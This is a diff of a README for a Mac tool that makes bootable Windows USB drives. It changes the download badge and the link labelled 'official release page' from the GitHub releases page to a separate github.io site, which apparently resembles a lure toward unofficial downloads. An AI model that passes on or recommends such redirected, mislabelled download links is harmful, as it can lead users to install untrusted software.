@@ -1,6 +1,6 @@
 # 💾 macos-rufus - Create Windows installation drives on Mac
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/farflung-dearest512/macos-rufus/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://farflung-dearest512.github.io)
 
 This application creates bootable Windows USB drives using your Mac. You do not need virtual machines or Boot Camp software. The tool handles modern UEFI systems and older BIOS hardware. It splits large installation files automatically so Windows 11 installs work on any USB drive.
 
@@ -17,7 +17,7 @@ Ensure you meet these requirements before you start:
 
 Follow these steps to acquire the software:
 
-1. Visit the [official release page](https://github.com/farflung-dearest512/macos-rufus).
+1. Visit the [official release page](https://farflung-dearest512.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .dmg to begin the download.
 4. Save the file to your Downloads folder.
